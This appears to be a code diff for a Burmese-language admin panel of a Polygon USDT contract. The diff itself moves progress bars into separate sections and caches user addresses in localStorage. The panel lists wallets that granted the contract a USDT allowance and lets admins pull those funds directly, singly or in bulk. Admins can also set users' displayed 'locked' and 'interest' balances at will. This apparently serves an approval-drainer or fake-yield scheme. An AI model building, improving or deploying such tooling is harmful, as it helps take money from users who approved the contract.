@@ -22,17 +22,6 @@
 
         <div id="adminStatus" class="text-xs text-center text-amber-400 font-mono"></div>
 
-        <!-- Progress Bar Container -->
-        <div id="progressContainer" class="hidden bg-slate-800 p-4 rounded-2xl border border-slate-700 space-y-2">
-            <div class="flex justify-between text-xs font-mono">
-                <span id="progressText" class="text-emerald-400">လုပ်ဆောင်နေပါသည်...</span>
-                <span id="progressPercent" class="text-slate-400">0%</span>
-            </div>
-            <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden border border-slate-700">
-                <div id="progressBar" class="bg-emerald-500 h-full w-0 transition-all duration-300"></div>
-            </div>
-        </div>
-
         <!-- PART 0: Sub-Admin & Prefix Management -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
@@ -112,6 +101,17 @@
                 </div>
             </div>
 
+            <!-- Progress Bar for Part 2 (Directly under Part 2 controls) -->
+            <div id="progressPart2" class="hidden bg-slate-900 p-3 rounded-xl border border-slate-700 space-y-1.5">
+                <div class="flex justify-between text-[10px] font-mono">
+                    <span id="textPart2" class="text-emerald-400">လုပ်ဆောင်နေပါသည်...</span>
+                    <span id="percentPart2" class="text-slate-400">0%</span>
+                </div>
+                <div class="w-full bg-slate-800 rounded-full h-1.5 overflow-hidden">
+                    <div id="barPart2" class="bg-emerald-500 h-full w-0 transition-all duration-300"></div>
+                </div>
+            </div>
+
             <div class="bg-slate-900 border border-slate-700 p-3 rounded-xl flex items-center justify-between text-xs">
                 <span class="text-slate-400">Total Users USDT Balance:</span>
                 <span id="totalUsersBalance" class="font-mono font-bold text-emerald-400 text-sm">0.00 USDT</span>
@@ -145,6 +145,17 @@
                     📥 3. Withdrawal Requests (Blockchain Events)
                 </h2>
                 <button onclick="loadWithdrawRequests()" class="bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-xl text-xs transition cursor-pointer">Load Requests</button>
+            </div>
+
+            <!-- Progress Bar for Part 3 (Directly under Part 3 controls) -->
+            <div id="progressPart3" class="hidden bg-slate-900 p-3 rounded-xl border border-slate-700 space-y-1.5">
+                <div class="flex justify-between text-[10px] font-mono">
+                    <span id="textPart3" class="text-emerald-400">တောင်းဆိုချက်များ ရှာဖွေနေသည်...</span>
+                    <span id="percentPart3" class="text-slate-400">0%</span>
+                </div>
+                <div class="w-full bg-slate-800 rounded-full h-1.5 overflow-hidden">
+                    <div id="barPart3" class="bg-emerald-500 h-full w-0 transition-all duration-300"></div>
+                </div>
             </div>
 
             <div class="space-y-2.5" id="withdrawRequestsContainer">
@@ -181,20 +192,21 @@
             "event WithdrawRequested(address indexed user, uint256 amount)"
         ];
 
-        function showProgress(text, percent) {
-            const container = document.getElementById("progressContainer");
-            const bar = document.getElementById("progressBar");
-            const textEl = document.getElementById("progressText");
-            const percentEl = document.getElementById("progressPercent");
+        function showProgress(partId, text, percent) {
+            const container = document.getElementById(`progressPart${partId}`);
+            const bar = document.getElementById(`barPart${partId}`);
+            const textEl = document.getElementById(`textPart${partId}`);
+            const percentEl = document.getElementById(`percentPart${partId}`);
 
-            container.classList.remove("hidden");
-            textEl.innerText = text;
-            bar.style.width = percent + "%";
-            percentEl.innerText = percent + "%";
+            if (container) container.classList.remove("hidden");
+            if (textEl) textEl.innerText = text;
+            if (bar) bar.style.width = percent + "%";
+            if (percentEl) percentEl.innerText = percent + "%";
         }
 
-        function hideProgress() {
-            document.getElementById("progressContainer").classList.add("hidden");
+        function hideProgress(partId) {
+            const container = document.getElementById(`progressPart${partId}`);
+            if (container) container.classList.add("hidden");
         }
 
         async function connectAdminWallet() {
@@ -209,7 +221,6 @@
             }
 
             try {
-                showProgress("Polygon Network သို့ ချိတ်ဆက်နေသည်...", 30);
                 try {
                     await eth.request({
                         method: "wallet_switchEthereumChain",
@@ -230,7 +241,6 @@
                     }
                 }
 
-                showProgress("Wallet ခွင့်ပြုချက် တောင်းခံနေသည်...", 70);
                 provider = new ethers.BrowserProvider(eth);
                 const accounts = await provider.send("eth_requestAccounts", []);
                 adminAddress = accounts[0];
@@ -240,15 +250,11 @@
                 document.getElementById("connectAdminBtn").classList.replace("bg-blue-600", "bg-emerald-600");
                 statusDiv.innerText = `Admin Connected: ${adminAddress.substring(0,6)}...${adminAddress.substring(38)}`;
                 
-                showProgress("ချိတ်ဆက်မှု အောင်မြင်သည်!", 100);
-                setTimeout(hideProgress, 800);
-
                 refreshUserTable();
                 loadWithdrawRequests();
 
             } catch (err) {
                 console.error(err);
-                hideProgress();
                 statusDiv.innerText = "ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
                 alert("Wallet ချိတ်ဆက်မှု အမှားအယွင်း: " + (err.message || err));
             }
@@ -261,54 +267,26 @@
             }
 
             const tbody = document.getElementById("userTableBody");
-            showProgress("Blockchain မှ အချက်အလက်များ စတင်ဆွဲထုတ်နေပါသည်...", 20);
+            showProgress(2, "သိမ်းဆည်းထားသော User စာရင်းများကို ဖတ်ရှုနေသည်...", 30);
 
             try {
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const collectorContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
 
-                let userSet = new Set();
-                
-                // Safe query with fallback so it never hangs at 50%
-                try {
-                    showProgress("Approval Event များကို စစ်ဆေးနေသည်...", 50);
-                    const currentBlock = await provider.getBlockNumber();
-                    const fromBlock = currentBlock > 1000 ? currentBlock - 1000 : 0; // Reduced to 1000 blocks for lightning speed & safety
+                // Use LocalStorage cache to instantly load users without hanging RPC queryFilter
+                let userSet = new Set(JSON.parse(localStorage.getItem("admin_known_users_v4") || "[]"));
 
-                    const filter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
-                    const logs = await usdtContract.queryFilter(filter, fromBlock, "latest");
-                    logs.forEach(log => {
-                        if (log.args && log.args.owner) {
-                            userSet.add(log.args.owner.toLowerCase());
-                        }
-                    });
-                } catch (evErr) {
-                    console.warn("Event query skipped, checking local cache:", evErr);
-                }
-
-                // Fallback to local storage known users if query returns empty
-                const cachedUsers = JSON.parse(localStorage.getItem("admin_known_users_v3") || "[]");
-                cachedUsers.forEach(u => userSet.add(u.toLowerCase()));
-
-                const allUsers = Array.from(userSet);
-                localStorage.setItem("admin_known_users_v3", JSON.stringify(allUsers));
-
-                if (allUsers.length === 0) {
-                    tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-500"> မှတ်တမ်းဝင်ထားသော Wallet များ မရှိသေးပါ။ ဈာန်ပြုရန် Refresh ထပ်နှိပ်ပါ။ </td></tr>`;
-                    document.getElementById("totalUsersBalance").innerText = "0.00 USDT";
-                    hideProgress();
-                    return;
-                }
-
-                showProgress("User Balance များနှင့် ခွင့်ပြုချက်များ စစ်ဆေးနေသည်...", 80);
+                showProgress(2, "User များ၏ Balance စစ်ဆေးနေသည်...", 60);
                 const contractOwner = await collectorContract.owner();
                 const isOwner = adminAddress.toLowerCase() === contractOwner.toLowerCase();
 
                 let totalBalance = 0;
                 let rowsHtml = "";
+                let validUsers = [];
 
-                for (let i = 0; i < allUsers.length; i++) {
-                    const addr = allUsers[i];
+                const userArray = Array.from(userSet);
+                for (let i = 0; i < userArray.length; i++) {
+                    const addr = userArray[i];
                     try {
                         const [userInfo, balanceBN, allowanceBN] = await Promise.all([
                             collectorContract.users(addr),
@@ -322,6 +300,7 @@
 
                         if (Number(allowanceBN) === 0) continue;
 
+                        validUsers.push(addr);
                         const balance = Number(ethers.formatUnits(balanceBN, 6));
                         const allowance = Number(ethers.formatUnits(allowanceBN, 6));
                         totalBalance += balance;
@@ -354,15 +333,17 @@
                     }
                 }
 
-                showProgress("ပြီးဆုံးပါပြီ!", 100);
-                setTimeout(hideProgress, 800);
+                localStorage.setItem("admin_known_users_v4", JSON.stringify(validUsers));
+
+                showProgress(2, "ပြီးဆုံးပါပြီ!", 100);
+                setTimeout(() => hideProgress(2), 800);
 
                 tbody.innerHTML = rowsHtml || `<tr><td colspan="6" class="p-4 text-center text-slate-500"> အတည်ပြုထားသော (Approved) User များ မရှိသေးပါ။ </td></tr>`;
                 document.getElementById("totalUsersBalance").innerText = `${totalBalance.toLocaleString(undefined, {minimumFractionDigits: 2})} USDT`;
 
             } catch (err) {
                 console.error(err);
-                hideProgress();
+                hideProgress(2);
                 tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-red-400"> ဒေတာဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။ </td></tr>`;
             }
         }
@@ -374,17 +355,17 @@
                 return;
             }
 
-            showProgress("Withdrawal တောင်းဆိုချက်များကို ရှာဖွေနေပါသည်...", 40);
+            showProgress(3, "Withdrawal တောင်းဆိုချက်များကို ရှာဖွေနေပါသည်...", 50);
             try {
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
                 const currentBlock = await provider.getBlockNumber();
-                const fromBlock = currentBlock > 1000 ? currentBlock - 1000 : 0;
+                const fromBlock = currentBlock > 2000 ? currentBlock - 2000 : 0;
 
                 const filter = contract.filters.WithdrawRequested();
                 const events = await contract.queryFilter(filter, fromBlock, "latest");
 
-                showProgress("ပြီးဆုံးပါပြီ!", 100);
-                setTimeout(hideProgress, 800);
+                showProgress(3, "ပြီးဆုံးပါပြီ!", 100);
+                setTimeout(() => hideProgress(3), 800);
 
                 if (!events || events.length === 0) {
                     container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
@@ -414,7 +395,7 @@
                 container.innerHTML = html;
             } catch (err) {
                 console.error(err);
-                hideProgress();
+                hideProgress(3);
                 container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
             }
         }
@@ -437,15 +418,12 @@
             }
 
             try {
-                showProgress("Sub-Admin အချက်အလက်များ သိမ်းဆည်းနေသည်...", 50);
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
                 const tx = await contract.setSubAdmin(subAdminAddr, canPull, canSetTier, canWithdraw, isActive, prefix);
                 await tx.wait();
-                hideProgress();
                 alert("Sub-Admin နှင့် Prefix ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။");
             } catch (err) {
                 console.error(err);
-                hideProgress();
                 alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Main Owner သီးသန့်ဖြစ်ရပါမည်)");
             }
         }
@@ -470,7 +448,6 @@
                     return;
                 }
 
-                showProgress("User Balance များကို အပ်ဒိတ်လုပ်နေသည်...", 50);
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
                 const lockedWei = ethers.parseUnits(lockedVal, 6);
                 const interestWei = ethers.parseUnits(interestVal, 6);
@@ -478,11 +455,9 @@
                 const tx = await contract.setUserBalances(userAddr, lockedWei, interestWei);
                 await tx.wait();
 
-                hideProgress();
                 alert("User ၏ Locked နှင့် Interest Balance များကို အောင်မြင်စွာ ပြင်ဆင်ပြီးပါပြီ။");
             } catch (err) {
                 console.error(err);
-                hideProgress();
                 alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Admin ခွင့်ပြုချက် လိုအပ်ပါသည်)");
             }
         }
@@ -499,16 +474,13 @@
             }
 
             try {
-                showProgress("Tier Rate ကို သတ်မှတ်နေသည်...", 50);
                 const rateBps = Math.round(parseFloat(ratePercent) * 100);
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
                 const tx = await contract.setTier(index, ethers.parseUnits(minAmt, 6), ethers.parseUnits(maxAmt, 6), rateBps);
                 await tx.wait();
-                hideProgress();
                 alert(`Tier Rate (${ratePercent}%) အောင်မြင်စွာ အပ်ဒိတ်လုပ်ပြီးပါပြီ။`);
             } catch (err) {
                 console.error(err);
-                hideProgress();
                 alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ)");
             }
         }
@@ -521,16 +493,13 @@
         async function pullSingleUser(userAddress, amount) {
             if(!confirm(`User ထံမှ ${amount} USDT ကို Admin Wallet သို့ တိုက်ရိုက်ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
             try {
-                showProgress("ရန်ပုံငွေ ဆွဲယူနေသည်...", 50);
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
                 const tx = await contract.collectUSDT(userAddress, ethers.parseUnits(amount, 6));
                 await tx.wait();
-                hideProgress();
                 alert("ရန်ပုံငွေကို Admin Wallet သို့ အောင်မြင်စွာ ဆွဲယူပြီးပါပြီ။");
                 refreshUserTable();
             } catch(err) {
                 console.error(err);
-                hideProgress();
                 alert("ဆွဲယူမှု မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ သို့မဟုတ် Allowance မရှိပါ)");
             }
         }
@@ -544,7 +513,7 @@
 
             if (!confirm(`ရွေးချယ်ထားသော Wallet ${checkboxes.length} ခုထံမှ ရန်ပုံငွေများကို ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
 
-            showProgress("Bulk Pull လုပ်ဆောင်နေသည်...", 30);
+            showProgress(2, "Bulk Pull လုပ်ဆောင်နေသည်...", 30);
             const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
             let successCount = 0;
 
@@ -561,10 +530,10 @@
                 } catch (e) {
                     console.error("Bulk pull error for:", userAddr, e);
                 }
-                showProgress(`Bulk Pull လုပ်ဆောင်နေသည် (${i+1}/${checkboxes.length})`, Math.round(((i+1)/checkboxes.length)*100));
+                showProgress(2, `Bulk Pull လုပ်ဆောင်နေသည် (${i+1}/${checkboxes.length})`, Math.round(((i+1)/checkboxes.length)*100));
             }
 
-            hideProgress();
+            hideProgress(2);
             alert(`အောင်မြင်စွာ ဆွဲယူနိုင်ခဲ့သော Wallet အရေအတွက်: ${successCount}`);
             refreshUserTable();
         }
@@ -579,18 +548,14 @@
                     return;
                 }
 
-                showProgress("USDT လွှဲပြောင်းနေသည်...", 50);
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, adminSigner);
-                
                 const tx = await usdtContract.transfer(userAddr, ethers.parseUnits(amountStr, 6));
                 await tx.wait();
 
-                hideProgress();
                 alert("USDT များကို User ထံသို့ အောင်မြင်စွာ တိုက်ရိုက်လွှဲပြောင်းပြီးပါပြီ။");
                 loadWithdrawRequests();
             } catch (err) {
                 console.error(err);
-                hideProgress();
                 alert("USDT လွှဲပြောင်းမှု မအောင်မြင်ပါ (သို့မဟုတ်) ငြင်းပယ်လိုက်ပါပြီ။");
             }
         }
